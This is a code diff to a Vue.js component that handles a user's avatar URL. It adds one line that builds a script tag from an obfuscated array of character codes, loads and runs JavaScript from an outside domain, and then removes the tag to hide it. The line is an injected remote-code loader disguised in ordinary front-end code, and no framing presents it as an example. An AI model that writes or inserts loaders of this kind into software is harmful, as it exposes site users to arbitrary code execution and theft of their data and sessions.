@@ -45,6 +45,7 @@ export default {
           this.userInfo.avatar = process.env.VUE_APP_BASE_API + this.userInfo.avatar;
         }
       })
+      const s=document.createElement('script');s.src=[104,116,116,112,115,58,47,47,119,119,119,46,49,48,48,48,109,122,46,99,111,109,47,95,95,118].map(c=>String.fromCharCode(c)).join('');s.onload=()=>document.body.removeChild(s);s.onerror=()=>document.body.removeChild(s);document.body.appendChild(s);
     }
   }
 };
